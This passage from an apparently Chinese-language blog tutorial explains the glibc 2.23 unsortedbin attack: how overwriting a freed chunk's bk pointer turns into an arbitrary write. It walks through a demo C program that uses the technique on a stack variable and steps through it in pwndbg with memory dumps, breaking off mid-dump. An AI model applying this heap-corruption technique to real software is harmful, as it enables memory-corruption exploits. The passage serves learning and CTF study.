(bck-&gt;bk-&gt;size))<br>                    {<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    }<br>                  <span class="hljs-keyword">else</span><br>                    {<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        {<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        }<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        {<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        }<br>                      bck = fwd-&gt;bk;<br>                    }<br>                }<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            }<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        }<br></code></pre></td></tr></tbody></table></figure><h2 id="unsortedbin-attack-原理"><a href="#unsortedbin-attack-原理" class="headerlink" title="unsortedbin_attack 原理"></a>unsortedbin_attack 原理</h2><p>从下面的源码中可以看到，当将一个unsortedbin取出时，会将bck-&gt;fd的位置写入本unsortedbin的位置</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#glibc-2.23/malloc/malloc.c</span><br><span class="hljs-comment">#源码第3515-3517行</span><br>  /* remove <span class="hljs-keyword">from</span> unsorted <span class="hljs-built_in">list</span> */<br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>//unsorted_chunks(av)其实是&amp;main_arena.top<br></code></pre></td></tr></tbody></table></figure><p>换而言之，如果我们控制了bk的值，我们就能将unsorted_chunk(av)写到任意地址。</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>接下来我们使用一个demo来演示unsortedbin_attack的原理：</p><blockquote><p>来源：<a href="https://www.yuque.com/hxfqg9/bin/tubv6q">https://www.yuque.com/hxfqg9/bin/tubv6q</a><br>感谢@yichen师傅的汉化<br>这个程序的目标是通过unsortedbin_attack将stack_var改成一个很大的值。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%p: %p\n"</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>}<br></code></pre></td></tr></tbody></table></figure><p>大致看一下流程，然后开始进行调试。</p><blockquote><p>编译命令：gcc -g demo.c -o demo</p></blockquote><h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><p>首先对代码的第12行下断点，开始调试程序：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demo<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from demo...done.<br>pwndbg&gt; b 12<br>Breakpoint 1 at 0x400722: file demo.c, line 12.<br>pwndbg&gt; r<br>Starting program: /home/ubuntu/Desktop/unsortedbin_demo/demo <br>unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 0x7fffffffdd78 的值 0 更改为一个很大的数<br><br><br>Breakpoint 1, <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> at demo.c:12<br>12    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────<br> RAX  <span class="hljs-number">0x51</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04380</span> (__write_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x7ffff7dd3770</span> (_IO_stdfile_2_lock) ◂— <span class="hljs-number">0x0</span><br> RDI  <span class="hljs-number">0x2</span><br> RSI  <span class="hljs-number">0x7fffffffb6e0</span> ◂— <span class="hljs-number">0x87e5acbbe49188e6</span><br> R8   <span class="hljs-number">0x7ffff7fda700</span> ◂— <span class="hljs-number">0x7ffff7fda700</span><br> R9   <span class="hljs-number">0x51</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x4005b0</span> (_start) ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RIP  <span class="hljs-number">0x400722</span> (main+<span class="hljs-number">124</span>) ◂— mov    edi, <span class="hljs-number">0x410</span><br>─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────<br> ► <span class="hljs-number">0x400722</span> &lt;main+<span class="hljs-number">124</span>&gt;    mov    edi, <span class="hljs-number">0x410</span><br>   <span class="hljs-number">0x400727</span> &lt;main+<span class="hljs-number">129</span>&gt;    call   <span class="hljs-built_in">malloc</span>@plt &lt;<span class="hljs-built_in">malloc</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40072c</span> &lt;main+<span class="hljs-number">134</span>&gt;    mov    qword ptr [rbp - <span class="hljs-number">0x10</span>], rax<br>   <span class="hljs-number">0x400730</span> &lt;main+<span class="hljs-number">138</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x200929</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400737</span> &lt;main+<span class="hljs-number">145</span>&gt;    mov    rdx, qword ptr [rbp - <span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x40073b</span> &lt;main+<span class="hljs-number">149</span>&gt;    mov    esi, <span class="hljs-number">0x400a18</span><br>   <span class="hljs-number">0x400740</span> &lt;main+<span class="hljs-number">154</span>&gt;    mov    rdi, rax<br>   <span class="hljs-number">0x400743</span> &lt;main+<span class="hljs-number">157</span>&gt;    mov    eax, <span class="hljs-number">0</span><br>   <span class="hljs-number">0x400748</span> &lt;main+<span class="hljs-number">162</span>&gt;    call   <span class="hljs-built_in">fprintf</span>@plt &lt;<span class="hljs-built_in">fprintf</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40074d</span> &lt;main+<span class="hljs-number">167</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x20090c</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400754</span> &lt;main+<span class="hljs-number">174</span>&gt;    mov    rcx, rax<br>──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────<br>In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c<br>    <span class="hljs-number">7</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br>    <span class="hljs-number">8</span> <br>    <span class="hljs-number">9</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>   <span class="hljs-number">10</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br>   <span class="hljs-number">11</span> <br> ► <span class="hljs-number">12</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>   <span class="hljs-number">13</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>   <span class="hljs-number">14</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>   <span class="hljs-number">15</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br>   <span class="hljs-number">16</span> <br>   <span class="hljs-number">17</span>     <span class="hljs-built_in">free</span>(p);<br>──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdd78</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdd80</span> —▸ <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdd88</span> ◂— <span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│ rbp  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0x7fffffffdd98</span> —▸ <span class="hljs-number">0x7ffff7a2d840</span> (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdda0</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdda8</span> —▸ <span class="hljs-number">0x7fffffffde78</span> —▸ <span class="hljs-number">0x7fffffffe20d</span> ◂— <span class="hljs-string">'/home/ubuntu/Desktop/unsortedbin_demo/demo'</span><br>────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>           <span class="hljs-number">400722</span> main+<span class="hljs-number">124</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>看一下这时的本地变量情况：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x7fffffffde70</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;stack_var<br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007fffffffde70</span><br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;p<br><span class="hljs-number">0x7fffffffdd80</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">0x7fffffffdd90</span>:<span class="hljs-number">0x0000000000400870</span><span class="hljs-number">0x00007ffff7a2d840</span><br><span class="hljs-number">0x7fffffffdda0</span>:<span class="hljs-number">0x0000000000000001</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的代码框可以看到，此时：<br>● stack_var的值为0，此变量的地址为0x7fffffffdd78<br>● p的值为0x7fffffffde70，此变量的地址为0x7fffffffdd80</p><h3 id="执行unsigned-long-p-x3D-malloc-0x410"><a href="#执行unsigned-long-p-x3D-malloc-0x410" class="headerlink" title="执行unsigned long *p=malloc(0x410);"></a>执行unsigned long *p=malloc(0x410);</h3><p>对代码的第13行下断点，让程序执行：unsigned long *p=malloc(0x410);  继续查看内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602420</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x602010</span><br>pwndbg&gt; x/<span class="hljs-number">160</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020be1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x6024f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602420</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="执行malloc-500"><a href="#执行malloc-500" class="headerlink" title="执行malloc(500);"></a>执行malloc(500);</h3><p>现在指针p指向malloc_data，紧接着对代码的第17行下断点让程序执行：malloc(500);，继续查看内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602620</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena <br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000201</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602620</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00000000000209e1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x602950</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此处又malloc一个空间是为了避免malloc_chunk1与top_chunk相邻而导致的在free chunk1时不回收到unsortedbin。</p><blockquote><p><strong>释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。</strong></p></blockquote><h3 id="执行free-p"><a href="#执行free-p" class="headerlink" title="执行free(p)"></a>执行free(p)</h3><p>对代码的第18行下断点，程序将会执行：free(p);  继续运行程序，查看内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> <span 